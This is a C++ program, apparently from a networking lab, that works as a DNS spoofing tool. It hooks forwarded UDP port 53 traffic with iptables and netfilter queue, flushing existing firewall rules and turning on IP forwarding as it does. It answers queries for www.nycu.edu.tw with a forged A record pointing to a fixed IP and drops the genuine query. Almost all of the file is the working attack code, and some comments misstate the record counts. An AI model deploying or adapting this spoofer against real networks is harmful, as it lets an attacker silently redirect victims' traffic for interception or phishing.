#include <iostream>
#include <cstring>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <linux/netfilter.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
using namespace std;

#define DNS_PORT 53
#define SPOOFED_IP "140.113.24.241"
#define TARGET_DOMAIN "www.nycu.edu.tw"

struct dnshdr
{
    uint16_t id;
    uint16_t flags;
    uint16_t q_count;
    uint16_t ans_count;
    uint16_t auth_count;
    uint16_t add_count;
};

uint16_t checksum(uint16_t *buf, int nwords)
{
    uint32_t sum = 0;
    for (; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return ~sum;
}

void send_dns_response(struct iphdr *iph, struct udphdr *udph, unsigned char *dns_data, int dns_len)
{
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0)
    {
        perror("socket");
        return;
    }

    char buffer[4096];
    memset(buffer, 0, sizeof(buffer));

    struct iphdr *rip = (struct iphdr *)buffer;
    struct udphdr *rup = (struct udphdr *)(buffer + sizeof(struct iphdr));
    unsigned char *rdns = (unsigned char *)(buffer + sizeof(struct iphdr) + sizeof(struct udphdr));

    // DNS header and question (copy from original)
    memcpy(rdns, dns_data, dns_len);

    struct dnshdr *dns = (struct dnshdr *)rdns;
    dns->flags = htons(0x8180); // Standard query response, No error
    dns->q_count = htons(1);    // One question
    dns->ans_count = htons(1);  // Three answers
    dns->auth_count = 0;
    dns->add_count = htons(0); // One additional record

    // Add answer section (CNAME for www.nycu.edu.tw)
    int qname_len = strlen((char *)(rdns + sizeof(struct dnshdr))) + 1;
    int offset = sizeof(struct dnshdr) + qname_len + 4; // qname + qtype + qclass

    // A record for www.nycu.edu.tw (140.113.24.241)
    rdns[offset++] = 0xc0;
    rdns[offset++] = 0x0c; // Name: pointer to domain name
    rdns[offset++] = 0x00;
    rdns[offset++] = 0x01; // Type: A
    rdns[offset++] = 0x00;
    rdns[offset++] = 0x01; // Class: IN
    rdns[offset++] = 0x00;
    rdns[offset++] = 0x00; // TTL
    rdns[offset++] = 0x00;
    rdns[offset++] = 0x3c; // TTL: 60s
    rdns[offset++] = 0x00;
    rdns[offset++] = 0x04; // RDLENGTH: 4 bytes
    if (inet_pton(AF_INET, SPOOFED_IP, rdns + offset) <= 0)
    {
        perror("inet_pton failed");
        return;
    }
    offset += 4;

    int total_len = offset;

    // Construct UDP header
    rup->source = udph->dest;
    rup->dest = udph->source;
    rup->len = htons(sizeof(struct udphdr) + total_len);
    rup->check = 0; // optional

    // Construct IP header
    rip->ihl = 5;
    rip->version = 4;
    rip->tos = 0;
    rip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + total_len);
    rip->id = htons(54321);
    rip->frag_off = 0;
    rip->ttl = 64;
    rip->protocol = IPPROTO_UDP;
    rip->check = 0;
    rip->saddr = iph->daddr;
    rip->daddr = iph->saddr;
    rip->check = checksum((uint16_t *)rip, sizeof(struct iphdr) / 2);

    // Send packet
    struct sockaddr_in to;
    to.sin_family = AF_INET;
    to.sin_addr.s_addr = iph->saddr;

    if (sendto(sock, buffer, ntohs(rip->tot_len), 0, (struct sockaddr *)&to, sizeof(to)) < 0)
    {
        perror("sendto failed");
    }
    else
    {
        //cout << "[DEBUG] DNS response sent successfully.\n";
    }

    close(sock);
}

static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
              struct nfq_data *nfa, void *data)
{
    unsigned char *pktData;
    int len = nfq_get_payload(nfa, &pktData);

    //cout << "[DEBUG] Packet received, length: " << len << "\n";

    struct iphdr *iph = nullptr; // 定義並初始化 iph
    if (len >= 0)
    {
        iph = (struct iphdr *)pktData;
        if (iph->protocol == IPPROTO_UDP)
        {
            //cout << "[DEBUG] UDP packet detected.\n";
            struct udphdr *udph = (struct udphdr *)(pktData + (iph->ihl * 4));
            unsigned char *dns_data = pktData + (iph->ihl * 4) + sizeof(struct udphdr);
            struct dnshdr *dns = (struct dnshdr *)dns_data;

            char *qname = (char *)(dns_data + sizeof(struct dnshdr));
            string domain;
            int i = 0;
            while (qname[i] != 0)
            {
                int len = qname[i];
                domain.append(qname + i + 1, len);
                domain.append(".");
                i += len + 1;
            }

            //cout << "[DEBUG] Extracted domain: " << domain << "\n";

            if (domain == string(TARGET_DOMAIN) + ".")
            {
                cout << "[+] Intercepted query for " << domain << " → spoofing.\n";
                send_dns_response(iph, udph, dns_data, len - ((unsigned char *)dns_data - pktData));
                return nfq_set_verdict(qh, nfq_get_msg_packet_hdr(nfa)->packet_id, NF_DROP, 0, NULL);
            }
            else
            {
                //cout << "[DEBUG] Non-target domain: " << domain << " → forwarding manually.\n";

                // 使用原始套接字手動轉發封包
                int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
                if (sock < 0)
                {
                    perror("socket failed");
                    return nfq_set_verdict(qh, nfq_get_msg_packet_hdr(nfa)->packet_id, NF_ACCEPT, 0, NULL);
                }

                struct sockaddr_in dest;
                dest.sin_family = AF_INET;
                dest.sin_addr.s_addr = iph->daddr; // 目標地址

                if (sendto(sock, pktData, len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
                {
                    perror("sendto failed");
                }
                else
                {
                    //cout << "[DEBUG] Packet forwarded manually to " << inet_ntoa(*(struct in_addr *)&iph->daddr) << "\n";
                }

                close(sock);

                // 丟棄原始封包，避免重複處理
                return nfq_set_verdict(qh, nfq_get_msg_packet_hdr(nfa)->packet_id, NF_DROP, 0, NULL);
            }
        }
        else
        {
            //cout << "[DEBUG] Non-UDP packet, protocol: " << (int)iph->protocol << "\n";
        }
    }
    else
    {
        //cout << "[DEBUG] Invalid packet length.\n";
    }

    // 預設返回 NF_ACCEPT
    return nfq_set_verdict(qh, nfq_get_msg_packet_hdr(nfa)->packet_id, NF_ACCEPT, 0, NULL);
}

void enable_ip_forwarding()
{
    system("sysctl -w net.ipv4.ip_forward=1");
}

void setup_iptables()
{
    // 設置 iptables 規則攔截 DNS 封包
    system("iptables -F");
    system("iptables -A FORWARD -j ACCEPT");
    system("iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1");

    //cout << "[INFO] iptables rules set for DNS interception.\n";
}

int main()
{
    struct nfq_handle *h = nfq_open();
    if (!h)
    {
        cerr << "[ERROR] Failed to open Netfilter Queue handle.\n";
        return 1;
    }

    struct nfq_q_handle *qh = nfq_create_queue(h, 1, &cb, NULL);
    if (!qh)
    {
        cerr << "[ERROR] Failed to create queue.\n";
        nfq_close(h);
        return 1;
    }

    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0)
    {
        cerr << "[ERROR] Failed to set packet copy mode.\n";
        nfq_destroy_queue(qh);
        nfq_close(h);
        return 1;
    }

    enable_ip_forwarding();
    setup_iptables();

    char buf[4096];
    int fd = nfq_fd(h);

    while (true)
    {
        int r = recv(fd, buf, sizeof(buf), 0);
        if (r >= 0)
        {
            //cout << "[DEBUG] Packet received in main, length: " << r << "\n";
            nfq_handle_packet(h, buf, r);
        }
    }

    nfq_destroy_queue(qh);
    nfq_close(h);
    return 0;
}
